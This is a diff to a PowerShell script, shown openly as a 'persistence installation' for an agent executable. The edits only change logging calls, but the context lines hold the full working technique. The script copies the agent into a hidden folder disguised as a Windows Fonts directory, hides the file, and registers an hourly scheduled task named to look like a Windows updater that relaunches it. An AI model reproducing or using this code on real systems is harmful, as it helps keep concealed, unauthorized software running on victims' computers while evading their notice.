@@ -2,12 +2,12 @@ $ProgressPreference = 'Continue'
 $ErrorActionPreference = 'Stop'
 
 # -------------------------------------------------------------------
-# Function to get the agent path automatically
+# Function to get the agent path automatically (returns only the path)
 # -------------------------------------------------------------------
 function Get-AgentPath {
     # 1. Try environment variable first
     if ($env:AgentPath -and (Test-Path $env:AgentPath)) {
-        Write-Output "[+] Using AgentPath from environment: $env:AgentPath"
+        Write-Host "[+] Using AgentPath from environment: $env:AgentPath"
         return $env:AgentPath
     }
 
@@ -17,7 +17,7 @@ function Get-AgentPath {
         if ($parentPid) {
             $parentPath = (Get-Process -Id $parentPid -ErrorAction Stop).Path
             if ($parentPath -and (Test-Path $parentPath)) {
-                Write-Output "[+] Detected agent as parent process: $parentPath"
+                Write-Host "[+] Detected agent as parent process: $parentPath"
                 return $parentPath
             }
         }
@@ -28,7 +28,7 @@ function Get-AgentPath {
     if ($proc) {
         $procPath = $proc.Path
         if ($procPath -and (Test-Path $procPath)) {
-            Write-Output "[+] Found running agent.exe at: $procPath"
+            Write-Host "[+] Found running agent.exe at: $procPath"
             return $procPath
         }
     }
@@ -41,7 +41,7 @@ function Get-AgentPath {
     )
     foreach ($path in $commonPaths) {
         if (Test-Path $path) {
-            Write-Output "[+] Found agent at common location: $path"
+            Write-Host "[+] Found agent at common location: $path"
             return $path
         }
     }
@@ -54,14 +54,14 @@ function Get-AgentPath {
 # Main persistence installation
 # -------------------------------------------------------------------
 $agentPath = Get-AgentPath
-Write-Output "[+] Using agent: $agentPath"
+Write-Host "[+] Using agent: $agentPath"
 
 # --- 1. Hidden folder ---
 $hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
 if (-not (Test-Path $hideDir)) {
     New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
     attrib +h $hideDir
-    Write-Output "[+] Created hidden folder: $hideDir"
+    Write-Host "[+] Created hidden folder: $hideDir"
 }
 
 # --- 2. Copy agent to hidden folder ---
@@ -75,7 +75,7 @@ if (-not (Test-Path $agentFile)) {
     exit 1
 }
 attrib +h $agentFile
-Write-Output "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"
+Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"
 
 # --- 3. Launcher script (just runs the exe) ---
 $launcherPath = "$hideDir\run.ps1"
@@ -101,14 +101,15 @@ $taskName = "WindowsUpdaterTaskHourly"
 schtasks /delete /tn $taskName /f 2>$null
 schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
 if ($LASTEXITCODE -eq 0) {
-    Write-Output "✅ Scheduled task created (runs every 1 hour)."
+    Write-Host "✅ Scheduled task created (runs every 1 hour)."
     schtasks /run /tn $taskName 2>$null
-    Write-Output "✅ Agent launched immediately."
+    Write-Host "✅ Agent launched immediately."
 } else {
     Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
     exit 1
 }
 
-Write-Output "`n✅ PERSISTENCE COMPLETE"
-Write-Output "Agent location: $agentFile (hidden)"
-Write-Output "Task: $taskName runs every hour"
+Write-Host ""
+Write-Host "✅ PERSISTENCE COMPLETE"
+Write-Host "Agent location: $agentFile (hidden)"
+Write-Host "Task: $taskName runs every hour"
